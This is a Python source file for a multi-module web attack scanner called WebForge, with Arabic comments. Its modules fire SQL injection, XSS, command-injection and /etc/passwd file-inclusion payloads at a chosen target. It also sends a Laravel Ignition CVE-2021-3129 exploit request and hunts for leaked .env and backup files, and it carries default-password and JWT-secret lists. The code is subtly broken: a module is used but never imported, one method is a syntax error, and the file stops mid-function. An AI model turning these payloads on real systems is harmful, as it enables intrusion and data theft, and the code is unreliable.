#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebForge — Web Application Security Toolkit (27 modules)
يعمل على Termux و Linux (Python stdlib فقط)
الاستخدام:
    python3 webforge.py --list
    python3 webforge.py --all https://target.com
    python3 webforge.py laravel https://target.com
    python3 webforge.py sqli "https://target.com/item?id=1"
"""
import argparse, base64, concurrent.futures, html, json, os, random
import re, socket, ssl, struct, sys, time, urllib.parse

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
TIMEOUT = 8
THREADS = 10
MODULES = {}   # name -> (desc, fn)
ALL_SUITE = ["detect","headers","robots","cookies","waf","ports","tls","dns",
             "dirs","backup","admin","api","phpinfo","laravel","subdomains",
             "sqli","xss","ssti","cmd","lfi","open-redirect","cors"]

# ---------------------------------------------------------------- helpers
def c(text, code):
    return f"\033[{code}m{text}\033[0m" if sys.stdout.isatty() else text

class R:
    def __init__(self, target):
        self.target = target; self.finds = []; self.lines = []
    def good(self, m):  self.lines.append(("info", m));  print(c("[*]", "1;36") + " " + m)
    def info(self, m):  self.lines.append(("info", m));  print(c("[*]", "1;36") + " " + m)
    def warn(self, m):  self.lines.append(("warn", m));  print(c("[!]", "1;33") + " " + m)
    def vuln(self, m):  self.finds.append(m); self.lines.append(("vuln", m))
                        print(c("[VULN]", "1;31") + " " + m)

def norm_target(t):
    if not t.startswith(("http://", "https://")):
        t = "https://" + t
    u = urllib.parse.urlsplit(t)
    return f"{u.scheme}://{u.netloc}"

def req(url, method="GET", data=None, headers=None, timeout=TIMEOUT,
        redirects=False, max_redir=3):
    """طلب HTTP كامل مع التحكم بالتحويلات. يرجع (status, headers_dict, body_bytes)"""
    for _ in range(max_redir + 1):
        u = urllib.parse.urlsplit(url)
        port = u.port or (443 if u.scheme == "https" else 80)
        if u.scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(u.hostname, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(u.hostname, port, timeout=timeout)
        h = {"User-Agent": UA, "Accept": "*/*", "Accept-Encoding": "identity"}
        if headers: h.update(headers)
        path = u.path or "/"
        if u.query: path += "?" + u.query
        try:
            conn.request(method, path, body=data, headers=h)
            r = conn.getresponse()
            body = r.read()
            hdrs = {k.lower(): v for k, v in r.getheaders()}
            conn.close()
        except Exception:
            conn.close(); return 0, {}, b""
        if redirects and r.status in (301, 302, 303, 307, 308) and "location" in hdrs:
            url = urllib.parse.urljoin(url, hdrs["location"])
            continue
        return r.status, hdrs, body
    return 0, {}, b""

def get(url, **kw):
    st, h, b = req(url, **kw)
    return st, h, b.decode("utf-8", "replace")

def get_params(turl):
    u = urllib.parse.urlsplit(turl)
    p = urllib.parse.parse_qsl(u.query)
    return [k for k, _ in p] or []

def params_or_common(turl):
    ps = get_params(turl)
    return ps or COMMON_PARAMS

def load_list(path):
    try:
        return [l.strip() for l in open(path, encoding="utf-8", errors="replace")
                if l.strip() and not l.startswith("#")]
    except Exception:
        sys.exit(f"[-] لا يمكن قراءة {path}")

def module(name, desc):
    def deco(fn): MODULES[name] = (desc, fn); return fn
    return deco

# ---------------------------------------------------------------- wordlists
COMMON_PARAMS = ["id","page","file","url","q","search","name","cat","category",
                 "lang","redirect","next","img","image","path","dir","folder",
                 "view","template","include","read","download","action","cmd","command"]

COMMON_PATHS = [
 ".env",".env.backup",".env.bak",".env.old",".env.example",".env.save",
 ".git/HEAD",".git/config",".gitignore","git/config",".svn/entries",
 "backup.zip","backup.tar.gz","backup.sql","db.sql","database.sql","dump.sql",
 "db_backup.sql","site.zip","www.zip","config.php","config.php.bak","config.old",
 ".htaccess","server-status","server-info","phpmyadmin","pma","adminer.php",
 "_ignition/health-check","_ignition/execute-solution","telescope","horizon",
 "storage/logs/laravel.log","storage/framework/sessions","vendor/autoload.php",
 "vendor/composer/installed.json","composer.json","composer.lock","artisan",
 "public/.env","app/.env","web.config","phpinfo.php","info.php","test.php","i.php",
 "robots.txt","sitemap.xml","crossdomain.xml","wp-login.php","wp-admin",
 "administrator","admin","login","signin","api","api/","graphql","health","status",
 "swagger","swagger-ui.html","api-docs","v1","v2","docs","debug","test","tmp",
 "temp","upload","uploads","download","files","assets","static","img","images",
 "css","js","favicon.ico","manifest.json",".well-known/security.txt",
 "console","dashboard","panel","cms","manager","admin/login","administrator/login",
 "xmlrpc.php","user.php","index.php.bak","shell.php","cmd.php","upload.php",
]

ADMIN_PATHS = ["admin","administrator","admin/login","admin/index.php","login",
 "signin","auth","auth/login","dashboard","panel","cms","manager","adminpanel",
 "admin/dashboard","user/login","account/login","portal","controlpanel","cp",
 "backend","staff","moderator","superadmin","console","secure","adminarea"]

API_PATHS = ["api","api/v1","api/v2","api/v3","api/users","api/user","api/login",
 "api/auth","api/token","api/register","api/admin","api/health","api/status",
 "api/config","api/settings","api/version","api/search","api/items","api/products",
 "api/orders","api/files","api/upload","api/webhook","api/callback","api/export",
 "api/import","api/stats","api/me","api/profile","api/session","api/csrf",
 "api/refresh","api/logout","graphql","graphiql","api/graphql","v1","v2","v3"]

SQLI_ERR = re.compile(
    r"(SQL syntax|SQLSTATE|mysql_|mysqli_|PostgreSQL|ORA-\d{5}|SQLite3|sqlite_|"
    r"syntax error|unclosed quotation|Warning:\s+\w+_query|ODBC SQL Server|"
    r"Microsoft OLE DB|You have an error in your SQL)", re.I)

XSS_PAYLOADS = ['<script>alert(1)</script>', '<svg/onload=alert(1)>',
                '"><img src=x onerror=alert(1)>']
SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "{{7*'7'}}"]
CMD_PAYLOADS  = [(";echo VFZQTEST", "VFZQTEST"), ("|echo VFZQTEST", "VFZQTEST"),
                 (";sleep 3", None), ("|sleep 3", None), ("`sleep 3`", None),
                 ("$(sleep 3)", None)]
LFI_PAYLOADS = ["../../../../etc/passwd", "....//....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2fetc/passwd", "..%252f..%252f..%252fetc/passwd",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "/etc/passwd", "../../../../../../../../etc/passwd"]
REDIRECT_PARAMS = ["url","redirect","next","return","returnUrl","return_url","dest",
 "destination","target","go","out","rurl","redirect_url","callback","image_url",
 "img_url","link","to","forward","redir","ru","data","page","view","ref","referer"]
WAF_HINTS = ["cloudflare","cf-ray","__cfduid","mod_security","modsecurity","owasp",
 "imperva","incapsula","akamai","sucuri","barracuda","wordfence","f5 bigip",
 "bigip","blocked","access denied","request blocked","attention required",
 "forbidden","captcha","verify you are human","sec-fetch","cf-chl","403 forbidden"]
JWT_SECRETS = ["secret","password","123456","qwerty","admin","letmein","jwt_secret",
 "supersecret","changeme","secretkey","key","test","token","your-256-bit-secret",
 "iloveyou","dragon","monkey","master","football","shadow","baseball","access",
 "hello","welcome","admin123","root","toor","passw0rd","P@ssw0rd","secret123",
 "s3cr3t","default","changeit","12345678","123456789","abcdef","abc123","111111",
 "000000","654321","666666","987654321","123123","112233","102030","mysupersecret"]
PORTS = [21,22,23,25,53,80,110,143,443,445,853,993,995,1433,1521,2375,3000,3306,
         3389,5432,5900,6379,8000,8080,8443,8888,9000,9090,9200,27017]
USERS = ["admin","administrator","root","user","test","guest","webmaster","operator",
         "support","demo","info","backup","admin1","manager"]
PASSES = ["admin","password","123456","admin123","password123","root","toor","test",
          "test123","letmein","welcome","12345678","qwerty","P@ssw0rd","passw0rd",
          "changeme","default","1234","12345","0000","admin@123","Admin@123","123"]

TAKEOVER_SERVICES = ["github.io","herokudns.com","herokussl.com","herokuapp.com",
 "amazonaws.com","cloudfront.net","azurewebsites.net","trafficmanager.net",
 "cloudapp.net","pantheon.io","fastly.net","surge.sh","bitbucket.io","ghost.io",
 "shopify.com","myshopify.com","wordpress.com","zendesk.com","readme.io",
 "netlify.app","gitlab.io","pages.dev","web.app","firebaseapp.com","s3.amazonaws.com"]

# ---------------------------------------------------------------- DNS mini
def _enc_name(name):
    out = b""
    for lbl in name.rstrip(".").split("."):
        if lbl: out += bytes([len(lbl)]) + lbl.encode()
    return out + b"\x00"

def _resolver():
    try:
        for line in open("/etc/resolv.conf"):
            if line.startswith("nameserver"):
                return line.split()[1]
    except Exception: pass
    return "8.8.8.8"

def _parse_name(data, off):
    labels, jumped, end = [], False, off
    while True:
        l = data[off]
        if l & 0xC0 == 0xC0:
            if not jumped: end = off + 2
            off = ((l & 0x3F) << 8) | data[off + 1]; jumped = True
        elif l == 0:
            if not jumped: end = off + 1
            break
        else:
            off += 1
            labels.append(data[off:off + l].decode(errors="replace")); off += l
    return ".".join(labels), end

def _parse_dns(data, qtype):
    if len(data) < 12: return None
    rcode = struct.unpack_from(">H", data, 2)[0] & 0xF
    ancount = struct.unpack_from(">H", data, 6)[0]
    off = 12
    while True:                       # تخطي السؤال
        if data[off] == 0: off += 1; break
        if data[off] & 0xC0 == 0xC0: off += 2; break
        off += 1 + data[off]
    off += 4
    ans = []
    for _ in range(ancount):
        name, off = _parse_name(data, off)
        rtype, rclass, ttl, rdlen = struct.unpack_from(">HHIH", data, off); off += 10
        rstart = off - rdlen
        if rtype == 1 and rdlen == 4:
            ans.append(("A", socket.inet_ntoa(data[rstart:rstart+4])))
        elif rtype == 28 and rdlen == 16:
            ans.append(("AAAA", socket.inet_ntop(socket.AF_INET6, data[rstart:rstart+16])))
        elif rtype == 5:
            cn, _ = _parse_name(data, rstart); ans.append(("CNAME", cn))
        elif rtype == 2:
            ns, _ = _parse_name(data, rstart); ans.append(("NS", ns))
        elif rtype == 15:
            pref = struct.unpack_from(">H", data, rstart)[0]
            mx, _ = _parse_name(data, rstart + 2); ans.append(("MX", f"{pref} {mx}"))
        elif rtype == 16:
            p, txt = rstart, b""
            while p < rstart + rdlen:
                n = data[p]; p += 1; txt += data[p:p+n]; p += n
            ans.append(("TXT", txt.decode(errors="replace")))
        off += 0 if rtype in (1, 28) else 0
    if rcode == 3: return "NXDOMAIN"
    return ans or None

def dns_query(name, qtype, server=None, timeout=3):
    try:
        tid = random.randint(0, 0xFFFF)
        q = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0) + \
            _enc_name(name) + struct.pack(">HH", qtype, 1)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(q, (server or _resolver(), 53))
        data, _ = s.recvfrom(4096)
        s.close()
        return _parse_dns(data, qtype)
    except Exception:
        return None

def axfr(domain, ns, timeout=4):
    try:
        tid = random.randint(0, 0xFFFF)
        q = struct.pack(">HHHHHH", tid, 0x0000, 1, 0, 0, 0) + \
            _enc_name(domain) + struct.pack(">HH", 252, 1)
        s = socket.create_connection((ns, 53), timeout)
        s.settimeout(timeout)
        s.sendall(struct.pack(">H", len(q)) + q)
        ln = struct.unpack(">H", s.recv(2))[0]
        data = b""
        while len(data) < ln:
            chunk = s.recv(ln - len(data))
            if not chunk: break
            data += chunk
        s.close()
        return struct.unpack_from(">H", data, 6)[0] if len(data) >= 12 else 0
    except Exception:
        return None

# ---------------------------------------------------------------- modules
@module("detect", "كشف التقنيات والإطار (Laravel/PHP/...")
def m_detect(base, a, R):
    st, h, b = get(base + "/")
    server = h.get("server", ""); xp = h.get("x-powered-by", "")
    R.good(f"HTTP {st} — Server: {server or '?'} | X-Powered-By: {xp or '?'}")
    hints = []
    if "laravel_session" in str(h.get("set-cookie", "")): hints.append("cookie laravel_session")
    if "xsrf-token" in str(h.get("set-cookie", "")).lower(): hints.append("cookie XSRF-TOKEN")
    low = b.lower()
    if 'csrf-token' in low: hints.append("meta csrf-token (Blade)")
    if '_token' in low and 'laravel' in low: hints.append("علامات Laravel")
    for p in ["_ignition/health-check", "sanctum/csrf-cookie", "telescope", "horizon",
              "vendor/composer/installed.json", "storage/logs/laravel.log"]:
        s2, _, _ = get(base + "/" + p)
        if s2 in (200, 204, 302): hints.append(f"{p} -> {s2}")
    if hints:
        R.vuln("يبدو أنها Laravel: " + ", ".join(hints))
    else:
        R.info("لا توجد مؤشرات مباشرة على Laravel — فحص أعمق في module laravel")
    # نسخة Laravel من installed.json
    s3, _, b3 = get(base + "/vendor/composer/installed.json")
    if s3 == 200:
        m = re.search(r'"name"\s*:\s*"laravel/framework".{0,400}?"version"\s*:\s*"([^"]+)"',
                      b3, re.S)
        if m: R.info(f"نسخة laravel/framework: {m.group(1)}")

@module("headers", "فحص ترويسات الأمان")
def m_headers(base, a, R):
    _, h, _ = get(base + "/")
    needed = {"strict-transport-security": "HSTS",
              "content-security-policy": "CSP",
              "x-frame-options": "X-Frame-Options",
              "x-content-type-options": "X-Content-Type-Options",
              "referrer-policy": "Referrer-Policy",
              "permissions-policy": "Permissions-Policy"}
    for k, name in needed.items():
        if k not in h: R.warn(f"مفقودة: {name}")
        else: R.good(f"موجودة: {name}")

@module("robots", "تحليل robots.txt و sitemap.xml")
def m_robots(base, a, R):
    st, _, b = get(base + "/robots.txt")
    if st == 200:
        for line in b.splitlines():
            if line.lower().startswith("disallow") and line.split(":", 1)[-1].strip() not in ("", "/"):
                R.warn("robots.txt: " + line.strip())
    else:
        R.info("لا يوجد robots.txt")
    st2, _, b2 = get(base + "/sitemap.xml")
    if st2 == 200:
        urls = re.findall(r"<loc>(.*?)</loc>", b2, re.I)
        R.good(f"sitemap.xml: {len(urls)} رابط")
        for u in urls[:10]: R.info("  " + u)

@module("cookies", "فحص خصائص ملفات تعريف الارتباط")
def m_cookies(base, a, R):
    _, h, _ = get(base + "/")
    sc = h.get("set-cookie", "")
    if not sc:
        R.info("لا توجد Set-Cookie"); return
    for part in sc.split(","):
        part = part.strip()
        if not part or "=" not in part: continue
        name = part.split("=", 1)[0].strip()
        flags = [f.lower() for f in part.split(";")[1:]]
        for f in ["httponly", "secure", "samesite"]:
            if not any(f in fl for fl in flags):
                R.warn(f"cookie {name}: مفقودة {f}")
        if any("samesite=none" in fl for fl in flags) and not any("secure" in fl for fl in flags):
            R.vuln(f"cookie {name}: SameSite=None بدون Secure — خطر CSRF/إرسال عبر HTTP")

@module("waf", "كشف جدار الحماية (WAF)")
def m_waf(base, a, R):
    for pay in ["?id=1' OR '1'='1", "?q=<script>alert(1)</script>"]:
        st, h, b = get(base + pay)
        blob = (b + " " + str(h)).lower()
        hits = [w for w in WAF_HINTS if w in blob]
        if st in (403, 406, 429) or hits:
            R.vuln(f"WAF محتمل (HTTP {st}): " + ", ".join(dict.fromkeys(hits)) if hits else f"HTTP {st} مع payload {pay}")
            return
    R.good("لا توجد مؤشرات WAF واضحة")

@module("ports", "فحص المنافذ المفتوحة")
def m_ports(base, a, R):
    host = urllib.parse.urlsplit(base).hostname
    def chk(p):
        try:
            with socket.create_connection((host, p), timeout=3):
                return p
        except Exception:
            return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=a.threads) as ex:
        open_ports = [p for p in ex.map(chk, PORTS) if p]
    if open_ports:
        R.vuln(f"منافذ مفتوحة: {', '.join(map(str, open_ports))}")
        for p in open_ports:
            svc = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
                   110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",3306:"MySQL",
                   3389:"RDP",5432:"PostgreSQL",6379:"Redis",8080:"HTTP-alt",
                   8443:"HTTPS-alt",9200:"Elasticsearch",27017:"MongoDB"}.get(p, "")
            if svc: R.info(f"  {p} -> {svc}")
    else:
        R.good("لا منافذ مفتوحة إضافية")

@module("tls", "فحص TLS والشهادة")
def m_tls(base, a, R):
    host = urllib.parse.urlsplit(base).hostname
    if urllib.parse.urlsplit(base).scheme != "https":
        R.info("الهدف HTTP — تخطي"); return
    for ver, label in [(ssl.TLSVersion.TLSv1, "TLSv1.0"),
                       (ssl.TLSVersion.TLSv1_1, "TLSv1.1"),
                       (ssl.TLSVersion.TLSv1_2, "TLSv1.2"),
                       (ssl.TLSVersion.TLSv1_3, "TLSv1.3")]:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ver; ctx.maximum_version = ver
            with socket.create_connection((host, 443), timeout=6) as s:
                with ctx.wrap_socket(s, server_hostname=host):
                    if ver in (ssl.TLSVersion.TLSv1, ssl.TLSVersion.TLSv1_1):
                        R.vuln(f"{label} مدعوم — إصدار قديم/ضعيف")
                    else:
                        R.good(f"{label} مدعوم")
        except Exception:
            pass
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, 443), timeout=6) as s:
            with ctx.wrap_socket(s, server_hostname=host) as t:
                cert = t.getpeercert()
        exp = cert.get("notAfter", "?")
        now = time.time()
        try:
            exp_t = time.mktime(time.strptime(exp, "%b %d %H:%M:%S %Y %Z"))
            days = (exp_t - now) / 86400
            if days < 0: R.vuln(f"الشهادة منتهية ({exp})")
            elif days < 30: R.warn(f"الشهادة تنتهي قريباً: {exp} ({int(days)} يوم)")
            else: R.good(f"الشهادة صالحة حتى {exp}")
        except Exception:
            R.info(f"انتهاء الشهادة: {exp}")
        iss = cert.get("issuer")
        if iss: R.info("المُصدر: " + str(dict(iss[0]).get("organizationName", iss[0])))
    except Exception:
        R.warn("تعذر قراءة الشهادة")

@module("dns", "سجلات DNS + محاولة Zone Transfer")
def m_dns(base, a, R):
    host = urllib.parse.urlsplit(base).hostname
    for qt, name in [(1, "A"), (2, "NS"), (15, "MX"), (16, "TXT"), (28, "AAAA")]:
        r = dns_query(host, qt)
        if r and r != "NXDOMAIN":
            for typ, val in r:
                if name == "A" and typ == "A": R.good(f"A: {val}")
                if name == "NS" and typ == "NS": R.good(f"NS: {val}")
                if name == "MX" and typ == "MX": R.good(f"MX: {val}")
                if name == "TXT" and typ == "TXT": R.info(f"TXT: {val[:80]}")
                if name == "AAAA" and typ == "AAAA": R.good(f"AAAA: {val}")
    nss = dns_query(host, 2)
    if nss and nss != "NXDOMAIN":
        for typ, ns in nss:
            cnt = axfr(host, ns)
            if cnt and cnt > 0:
                R.vuln(f"Zone Transfer ناجح عبر {ns} — {cnt} سجل مسرّب!")
            else:
                R.info(f"AXFR عبر {ns} مرفوض (آمن)")

@module("subdomains", "استكشاف النطاقات الفرعية (crt.sh)")
def m_subdomains(base, a, R):
    host = urllib.parse.urlsplit(base).hostname
    dom = host.split(".", 1)[-1] if host.count(".") >= 2 else host
    names = set()
    try:
        st, _, b = req(f"https://crt.sh/?q=%25.{dom}&output=json", timeout=25)
        if st == 200:
            for e in json.loads(b.decode("utf-8", "replace")):
                for n in (e.get("name_value") or "").split("\n"):
                    n = n.strip().lstrip("*.")
                    if n.endswith(dom): names.add(n)
    except Exception:
        pass
    if not names:
        try:
            st, _, b = get(f"https://api.hackertarget.com/hostsearch/?q={dom}")
            if st == 200:
                for line in b.splitlines():
                    h2 = line.split(",")[0].strip()
                    if h2.endswith(dom): names.add(h2)
        except Exception:
            pass
    if names:
        R.vuln(f"وجدنا {len(names)} نطاقاً فرعياً")
        for n in sorted(names)[:40]: R.info("  " + n)
    else:
        R.info("لا نتائج من crt.sh")

@module("takeover", "فحص استيلاء النطاقات الفرعية")
def m_takeover(base, a, R):
    host = urllib.parse.urlsplit(base).hostname
    dom = host.split(".", 1)[-1] if host.count(".") >= 2 else host
    subs = set()
    try:
        st, _, b = req(f"https://crt.sh/?q=%25.{dom}&output=json", timeout=25)
        if st == 200:
            for e in json.loads(b.decode("utf-8", "replace")):
                for n in (e.get("name_value") or "").split("\n"):
                    n = n.strip().lstrip("*.")
                    if n.endswith(dom): subs.add(n)
    except Exception:
        pass
    if not subs:
        R.info("لا نطاقات فرعية للفحص"); return
    def chk(sub):
        r = dns_query(sub, 5)          # CNAME
        if r and r != "NXDOMAIN":
            for typ, cn in r:
                if typ == "CNAME" and any(svc in cn.lower() for svc in TAKEOVER_SERVICES):
                    ar = dns_query(cn, 1)
                    if ar == "NXDOMAIN" or not ar:
                        return (sub, cn)
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=a.threads) as ex:
        for res in ex.map(chk, list(subs)):
            if res:
                R.vuln(f"احتمال استيلاء: {res[0]} -> CNAME {res[1]} (لا يحل — متاح للاستيلاء!)")
    R.info("اكتمل فحص الاستيلاء")

@module("dirs", "تخمين المسارات والأدلة")
def m_dirs(base, a, R):
    wl = load_list(a.wordlist) if a.wordlist else COMMON_PATHS
    def chk(p):
        st, h, b = get(f"{base}/{p}", timeout=a.timeout)
        if st in (200, 301, 302, 307, 308, 401, 403):
            return p, st, h.get("server", "")
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=a.threads) as ex:
        found = [r for r in ex.map(chk, wl) if r]
    if found:
        R.vuln(f"وجدنا {len(found)} مساراً مهماً")
        for p, st, srv in sorted(found, key=lambda x: -x[1]):
            R.info(f"  /{p}  ->  HTTP {st}")
    else:
        R.good("لا مسارات مثيرة للاهتمام")

@module("backup", "البحث عن ملفات النسخ الاحتياطي والملفات الحساسة")
def m_backup(base, a, R):
    exts = [".bak", ".old", ".orig", ".save", "~", ".swp", ".zip", ".tar.gz",
            ".sql", ".gz", ".log", ".txt"]
    cores = ["backup", "backups", "db", "database", "dump", "site", "www",
             "config", "config.php", ".env", "index.php", "admin", "data",
             "web", "app", "prod", "old", "new", "test", "temp"]
    words = ["password", "passwd", "secret", "app_key", "db_password", "mail_password",
             "api_key", "private_key", "token", "root:", "BEGIN RSA", "BEGIN OPENSSH"]
    targets = set()
    for c0 in cores:
        for e in exts[:6]:
            targets.add(f"{c0}{e}")
    targets |= {"backup.zip","backup.tar.gz","db.sql","database.sql","dump.sql",
                "www.zip","site.zip",".env.bak",".env.old",".env.save","config.php.bak",
                "index.php.bak","app.zip","data.zip","public.zip","storage.zip"}
    def chk(p):
        st, h, b = get(f"{base}/{p}", timeout=a.timeout)
        if st == 200 and len(b) > 0:
            found = [w for w in words if w.lower() in b.lower()][:3]
            if found or any(p.endswith(e) for e in (".zip",".tar.gz",".sql",".gz",".bak",".old")):
                return p, st, found
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=a.threads) as ex:
        for r in ex.map(chk, sorted(targets)):
            if r:
                p, st, words_f = r
                msg = f"  /{p}  (HTTP {st}, {len(open('/dev/null','rb').read())} بايت)"
                R.vuln(f"ملف حساس محتمل: /{p} (HTTP {st})" + (f" — يحتوي: {', '.join(words_f)}" if words_f else ""))

@module("admin", "البحث عن لوحات التحكم")
def m_admin(base, a, R):
    wl = load_list(a.wordlist) if a.wordlist else ADMIN_PATHS
    def chk(p):
        st, h, b = get(f"{base}/{p}", timeout=a.timeout)
        if st in (200, 302, 401, 403):
            return p, st, h.get("location", "")[:80]
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=a.threads) as ex:
        found = [r for r in ex.map(chk, wl) if r]
    if found:
        R.vuln("لوحات/مداخل محتملة:")
        for p, st, loc in found:
            R.info(f"  /{p}  HTTP {st}" + (f" -> {loc}" if loc else ""))
    else:
        R.good("لا لوحات تحكم مكشوفة")

@module("api", "استكشاف واجهات API و GraphQL")
def m_api(base, a, R):
    wl = load_list(a.wordlist) if a.wordlist else API_PATHS
    def chk(p):
        st, h, b = get(f"{base}/{p}", timeout=a.timeout)
        if st in (200, 401, 403, 500):
            return p, st, b[:200].replace("\n", " ")
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=a.threads) as ex:
        for r in ex.map(chk, wl):
            if r:
                R.vuln(f"API: /{r[0]}  ->  HTTP {r[1]}")
                if r[1] == 200 and r[2]:
                    R.info("    " + r[2][:150])
    # GraphQL introspection
    st, _, b = req(base + "/graphql", method="POST",
                   data='{"query":"{__schema{types{name}}}"}',
                   headers={"Content-Type": "application/json"})
    if st == 200 and '"types"' in b.decode("utf-8", "replace"):
        R.vuln("GraphQL introspection مفتوح — كشف كامل للـ schema!")
    st2, _, b2 = req(base + "/graphql", method="POST",
                     data='{"query":"{__typename}"}',
                     headers={"Content-Type": "application/json"})
    if st2 == 200: R.info("GraphQL endpoint يستجيب")

@module("phpinfo", "البحث عن صفحات phpinfo المكشوفة")
def m_phpinfo(base, a, R):
    for p in ["phpinfo.php", "info.php", "test.php", "i.php", "p.php",
              "php_info.php", "infophp.php", "php.php", "pi.php"]:
        st, _, b = get(f"{base}/{p}")
        if st == 200 and ("phpinfo()" in b or "PHP Version" in b or "php.ini" in b):
            R.vuln(f"phpinfo مكشوف: /{p} — تسريب إعدادات كاملة!")
            return
    R.good("لا صفحات phpinfo مكشوفة")

@module("laravel", "حزمة هجمات Laravel المتخصصة")
def m_laravel(base, a, R):
    env_leaked = False
    # 1) .env
    st, _, b = get(base + "/.env")
    if st == 200 and "APP_KEY" in b:
        keys = [l.split("=", 1)[0] for l in b.splitlines()
                if "=" in l and not l.startswith("#")]
        R.vuln("CRITICAL: /.env مكشوف! المفاتيح: " + ", ".join(keys[:15]))
        m = re.search(r"APP_KEY=(\S+)", b)
        if m:
            R.warn("APP_KEY موجود (مخفي في التقرير) — CVE-2018-15133: مع phpggc => RCE كامل")
            env_leaked = True
    # 2) Debug mode
    st2, _, b2 = get(base + "/definitely-not-here-xyz123")
    if st2 == 200 and ("Whoops" in b2 or "_ignition" in b2.lower()
                       or "Stack trace" in b2 or "vendor/laravel" in b2):
        R.vuln("APP_DEBUG=true — صفحة الخطأ تسرّب الكود والمتغيرات!")
        if "ignition" in b2.lower():
            R.warn("CVE-2021-3129 محتمل (Ignition + debug) — RCE عبر تسميم السجل")
        if re.search(r"11\.(?:9|1[0-9]|2[0-9]|3[0-5])\.\d+", b2):
            R.vuln("CVE-2024-13918/13919 محتمل: XSS عبر صفحة الخطأ (Laravel 11.9.0–11.35.1)")
    # 3) Ignition health-check + execute-solution
    st3, _, b3 = get(base + "/_ignition/health-check")
    if st3 == 200 and "status" in b3:
        R.info("Ignition مثبت — _ignition/health-check يستجيب")
        st4, _, b4 = req(base + "/_ignition/execute-solution", method="POST",
                         data='{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",'
                              '"parameters":{"variableName":"x","viewFile":"php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"}}',
                         headers={"Content-Type": "application/json"})
        if st4 in (405, 404):
            R.good("execute-solution غير متاح — مثبت/محدث (CVE-2021-3129 مستبعد)")
        else:
            R.vuln(f"execute-solution يستجيب HTTP {st4} — اختبر يدوياً CVE-2021-3129")
    # 4) Telescope / Horizon
    for p in ["telescope", "horizon"]:
        st5, _, b5 = get(base + "/" + p)
        if st5 == 200 and (p.lower() in b5.lower() or "Laravel" in b5):
            R.vuln(f"/{p} مكشوف بدون مصادقة — تسريب جلسات وأعمال!")
        elif st5 in (302, 401, 403):
            R.info(f"/{p} -> HTTP {st5} (محمي)")
    # 5) storage logs
    st6, _, b6 = get(base + "/storage/logs/laravel.log")
    if st6 == 200 and len(b6) > 500 and "ERROR" in b6:
        R.vuln("storage/logs/laravel.log قابل للقراءة — تسريب أخطاء واستثناءات!")
    # 6) vendor exposure
    st7, _, b7 = get(base + "/vendor/autoload.php")
    if st7 == 500: R.info("vendor موجود (الرد 500 طبيعي — ملف PHP بدون تنفيذ)")
    # 7) sanctum csrf
    st8, h8, _ = req(base + "/sanctum/csrf-cookie")
    if st8 in (200, 204) and "xsrf-token" in str(h8.get("set-cookie", "")).lower():
        R.info("API بـ Sanctum موجود — /sanctum/csrf-cookie يستجيب")
    # 8) Reverb
    st9, _, _ = req(base + "/apps", headers={"X-Requested-With": "XMLHttpRequest"})
    if st9 == 200: R.warn("تحقق من Reverb (CVE-2026-23524) — endpoint /apps يستجيب")
    if not (env_leaked or st2 == 200):
        R.good("لا تسريبات Laravel مباشرة في هذا الفحص السريع")

@module("sqli", "فحص حقن SQL (خطأ + منطقي + زمني)")
def m_sqli(turl, a, R):
    base = norm_target(turl)
    params = params_or_common(turl)
    t0 = time.time()
    get(base + "/" + ("?" + params[0] + "=1" if params else ""))
    base_t = max(time.time() - t0, 0.05)
    for p in params:
        for pay in ["'", "' OR 1=1-- -", "' OR 1=2-- -"]:
            st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
            if SQLI_ERR.search(b):
                R.vuln(f"SQLi (خطأ) في المعامل {p} — payload: {pay}")
            if "' OR 1=1-- -" in pay and "' OR 1=2-- -" not in pay:
                pass
        # boolean
        st1, _, b1 = get(f"{base}/?{p}={urllib.parse.quote('1 AND 1=1-- -')}")
        st2, _, b2 = get(f"{base}/?{p}={urllib.parse.quote('1 AND 1=2-- -')}")
        if st1 == st2 and len(b1) != len(b2) and len(b1) > 0:
            R.vuln(f"SQLi (منطقي) في المعامل {p} — اختلاف طول الرد {len(b1)} vs {len(b2)}")
        # time
        for p2 in ["' AND SLEEP(4)-- -", "1 AND SLEEP(4)", "'; WAITFOR DELAY '0:0:4'-- -"]:
            t1 = time.time()
            get(f"{base}/?{p}={urllib.parse.quote(p2)}")
            dt = time.time() - t1
            if dt >= 3.5 and dt >= base_t * 3:
                R.vuln(f"SQLi (زمني) في المعامل {p} — تأخير {dt:.1f}s: {p2}")
    R.info("اكتمل فحص SQLi — إذا لم تظهر نتائج جرب: --param على معاملات حقيقية")

@module("xss", "فحص XSS المنعكسة")
def m_xss(turl, a, R):
    base = norm_target(turl)
    for p in params_or_common(turl):
        for pay in XSS_PAYLOADS:
            st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
            if pay in b:
                R.vuln(f"XSS منعكسة في المعامل {p} — payload يتكرر حرفياً: {pay}")
                break
    R.info("اكتمل فحص XSS")

@module("ssti", "فحص حقن القوالب (Blade/Twig)")
def m_ssti(turl, a, R):
